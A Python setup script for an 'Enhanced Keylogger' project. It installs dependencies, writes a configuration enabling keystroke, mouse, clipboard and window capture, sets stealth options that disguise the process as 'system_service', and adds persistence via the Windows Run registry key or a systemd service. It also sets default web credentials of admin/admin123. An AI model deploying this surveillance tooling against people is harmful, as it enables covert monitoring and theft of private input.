#!/usr/bin/env python3
"""Setup script for the Enhanced Keylogger Project."""

import os
import sys
import json
import shutil
import subprocess
from pathlib import Path
from typing import Dict, Any, List


class KeyloggerSetup:
    """Setup manager for the Enhanced Keylogger."""
    
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.config_file = self.project_root / 'config.json'
        self.requirements_file = self.project_root / 'requirements.txt'
        self.keys_dir = self.project_root / 'keys'
        self.logs_dir = self.project_root / 'logs'
        self.screenshots_dir = self.project_root / 'screenshots'
        
    def check_python_version(self) -> bool:
        """Check if Python version is compatible."""
        if sys.version_info < (3, 8):
            print("ERROR: Python 3.8 or higher is required.")
            print(f"Current version: {sys.version}")
            return False
        
        print(f"Python version check passed: {sys.version.split()[0]}")
        return True
    
    def create_directories(self) -> bool:
        """Create necessary directories."""
        try:
            directories = [
                self.keys_dir,
                self.logs_dir,
                self.screenshots_dir,
                self.project_root / 'core',
                self.project_root / 'listeners',
                self.project_root / 'utils',
                self.project_root / 'parsers',
                self.project_root / 'web',
                self.project_root / 'tests'
            ]
            
            for directory in directories:
                directory.mkdir(exist_ok=True)
                print(f"Created directory: {directory}")
            
            # Set restrictive permissions on keys directory
            if os.name != 'nt':  # Unix-like systems
                os.chmod(self.keys_dir, 0o700)
            
            return True
            
        except Exception as e:
            print(f"ERROR creating directories: {e}")
            return False
    
    def install_dependencies(self) -> bool:
        """Install Python dependencies."""
        try:
            if not self.requirements_file.exists():
                print("❌ Error: requirements.txt not found")
                return False
            
            print("Installing Python dependencies...")
            
            # Upgrade pip first
            subprocess.run([
                sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'
            ], check=True, capture_output=True)
            
            # Install requirements
            result = subprocess.run([
                sys.executable, '-m', 'pip', 'install', '-r', str(self.requirements_file)
            ], check=True, capture_output=True, text=True)
            
            print("Dependencies installed successfully")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"ERROR installing dependencies: {e}")
            if e.stdout:
                print(f"STDOUT: {e.stdout}")
            if e.stderr:
                print(f"STDERR: {e.stderr}")
            return False
        except Exception as e:
            print(f"Unexpected error: {e}")
            return False
    
    def create_default_config(self) -> bool:
        """Create default configuration file."""
        try:
            if self.config_file.exists():
                response = input("WARNING: config.json already exists. Overwrite? (y/N): ")
                if response.lower() != 'y':
                    print("Keeping existing configuration")
                    return True
            
            default_config = {
                "logging": {
                    "level": "INFO",
                    "file_path": "logs/keylog.txt",
                    "max_size_mb": 100,
                    "buffer_size": 100,
                    "flush_interval": 5.0,
                    "enable_rotation": True,
                    "enable_encryption": True,
                    "backup_count": 5
                },
                "encryption": {
                    "enabled": True,
                    "key_file": "keys/encryption.key",
                    "algorithm": "AES-256-GCM"
                },
                "features": {
                    "keyboard": True,
                    "mouse": True,
                    "clipboard": True,
                    "screenshots": False,
                    "usb_monitoring": True,
                    "network_monitoring": False,
                    "window_tracking": True,
                    "performance_monitoring": True
                },
                "privacy": {
                    "sanitize_passwords": True,
                    "hash_sensitive_data": True,
                    "clipboard_max_length": 1000,
                    "excluded_applications": [
                        "password_manager.exe",
                        "keepass.exe",
                        "1password.exe",
                        "bitwarden.exe"
                    ],
                    "sensitive_keywords": [
                        "password", "passwd", "pwd",
                        "ssn", "social security",
                        "credit card", "card number",
                        "cvv", "pin", "secret"
                    ]
                },
                "performance": {
                    "screenshot_interval": 300,
                    "window_check_interval": 1.0,
                    "clipboard_check_interval": 0.5,
                    "max_memory_usage_mb": 500,
                    "thread_pool_size": 4
                },
                "remote": {
                    "enabled": False,
                    "server_url": "https://your-server.com/api/logs",
                    "api_key": "",
                    "upload_interval": 3600,
                    "compress_uploads": True
                },
                "alerts": {
                    "email_enabled": False,
                    "email_smtp_server": "smtp.gmail.com",
                    "email_smtp_port": 587,
                    "email_username": "",
                    "email_password": "",
                    "email_to": "",
                    "alert_on_startup": True,
                    "alert_on_errors": True
                },
                "stealth": {
                    "hide_console": False,
                    "process_name": "system_service",
                    "startup_delay": 30,
                    "auto_start": False
                },
                "web": {
                    "enabled": True,
                    "host": "127.0.0.1",
                    "port": 5000,
                    "debug": False,
                    "admin_username": "admin",
                    "admin_password": "admin123",
                    "secret_key": "your-secret-key-here"
                }
            }
            
            with open(self.config_file, 'w') as f:
                json.dump(default_config, f, indent=2)
            
            print(f"✅ Created default configuration: {self.config_file}")
            return True
            
        except Exception as e:
            print(f"❌ Error creating configuration: {e}")
            return False
    
    def generate_encryption_key(self) -> bool:
        """Generate encryption key."""
        try:
            key_file = self.keys_dir / 'encryption.key'
            
            if key_file.exists():
                response = input("⚠️  Encryption key already exists. Regenerate? (y/N): ")
                if response.lower() != 'y':
                    print("✅ Keeping existing encryption key")
                    return True
                else:
                    # Remove existing key so new one will be generated
                    key_file.unlink()
            
            # Import here to avoid dependency issues during setup
            from core.encryption_manager import EncryptionManager
            
            # Create EncryptionManager with key file path - it will auto-generate key
            encryption_manager = EncryptionManager(str(key_file))
            
            if encryption_manager.is_initialized():
                print(f"✅ Generated encryption key: {key_file}")
                return True
            else:
                print("❌ Failed to initialize encryption")
                return False
            
        except ImportError:
            print("⚠️  Cannot generate encryption key - dependencies not installed yet")
            print("   Run setup again after installing dependencies")
            return True
        except Exception as e:
            print(f"❌ Error generating encryption key: {e}")
            return False
    
    def run_tests(self) -> bool:
        """Run basic tests to verify installation."""
        try:
            print("🧪 Running basic tests...")
            
            # Test imports
            test_imports = [
                'psutil',
                'cryptography',
                'pynput',
                'PIL',
                'requests',
                'pyperclip'
            ]
            
            for module in test_imports:
                try:
                    __import__(module)
                    print(f"✅ Import test passed: {module}")
                except ImportError as e:
                    print(f"❌ Import test failed: {module} - {e}")
                    return False
            
            # Test configuration loading
            try:
                from core.config_manager import ConfigManager
                config = ConfigManager(str(self.config_file))
                validation_errors = config.validate_config()
                if not validation_errors:
                    print("✅ Configuration validation passed")
                else:
                    print("❌ Configuration validation failed:")
                    for error in validation_errors:
                        print(f"   - {error}")
                    return False
            except Exception as e:
                print(f"❌ Configuration test failed: {e}")
                return False
            
            print("✅ All tests passed")
            return True
            
        except Exception as e:
            print(f"❌ Error running tests: {e}")
            return False
    
    def setup_autostart(self) -> bool:
        """Setup autostart (optional)."""
        try:
            response = input("🚀 Setup autostart on system boot? (y/N): ")
            if response.lower() != 'y':
                return True
            
            if os.name == 'nt':  # Windows
                self._setup_windows_autostart()
            else:  # Unix-like
                self._setup_unix_autostart()
            
            return True
            
        except Exception as e:
            print(f"❌ Error setting up autostart: {e}")
            return False
    
    def _setup_windows_autostart(self):
        """Setup Windows autostart."""
        try:
            import winreg
            
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            script_path = str(self.project_root / 'main.py')
            python_path = sys.executable
            command = f'"{python_path}" "{script_path}" --daemon'
            
            winreg.SetValueEx(key, "EnhancedKeylogger", 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            
            print("✅ Windows autostart configured")
            
        except ImportError:
            print("❌ Cannot setup Windows autostart - winreg not available")
        except Exception as e:
            print(f"❌ Error setting up Windows autostart: {e}")
    
    def _setup_unix_autostart(self):
        """Setup Unix autostart."""
        try:
            # Create systemd service file
            service_content = f"""[Unit]
Description=Enhanced Keylogger
After=network.target

[Service]
Type=simple
User={os.getenv('USER', 'root')}
WorkingDirectory={self.project_root}
ExecStart={sys.executable} {self.project_root / 'main.py'} --daemon
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            
            service_file = Path.home() / '.config/systemd/user/enhanced-keylogger.service'
            service_file.parent.mkdir(parents=True, exist_ok=True)
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            print(f"Created systemd service: {service_file}")
            print("   Enable with: systemctl --user enable enhanced-keylogger.service")
            
        except Exception as e:
            print(f"ERROR setting up Unix autostart: {e}")
    
    def print_next_steps(self):
        """Print next steps for the user."""
        print("\n" + "="*60)
        print("SETUP COMPLETE!")
        print("="*60)
        print("\nNext Steps:")
        print("\n1. Review and customize configuration:")
        print(f"   Edit: {self.config_file}")
        print("\n2. Start the keylogger:")
        print("   Interactive mode: python main.py")
        print("   Web interface:   python main.py --web-only")
        print("   Background mode:  python main.py --daemon")
        print("\n3. Access web interface:")
        print("   URL: http://localhost:5000")
        print("   Username: admin")
        print("   Password: admin123")
        print("\n4. Run tests:")
        print("   python tests/test_keylogger.py")
        print("\n5. View logs:")
        print(f"   Location: {self.logs_dir}")
        print("\nIMPORTANT REMINDERS:")
        print("   - Change default web interface password")
        print("   - Review privacy settings in config.json")
        print("   - Ensure you have proper authorization to monitor")
        print("   - Comply with local privacy laws")
        print("\nDocumentation: README.md")
        print("Issues: Report via GitHub Issues")
        print("\n" + "="*60)
    
    def run_setup(self) -> bool:
        """Run the complete setup process."""
        print("Enhanced Keylogger Setup")
        print("="*40)
        
        steps = [
            ("Checking Python version", self.check_python_version),
            ("Creating directories", self.create_directories),
            ("Installing dependencies", self.install_dependencies),
            ("Creating configuration", self.create_default_config),
            ("Generating encryption key", self.generate_encryption_key),
            ("Running tests", self.run_tests),
            ("Setting up autostart", self.setup_autostart)
        ]
        
        for step_name, step_func in steps:
            print(f"\nStarting: {step_name}...")
            if not step_func():
                print(f"Setup failed at: {step_name}")
                return False
        
        self.print_next_steps()
        return True


def main():
    """Main setup function."""
    try:
        setup = KeyloggerSetup()
        success = setup.run_setup()
        sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        print("\nSetup interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error during setup: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()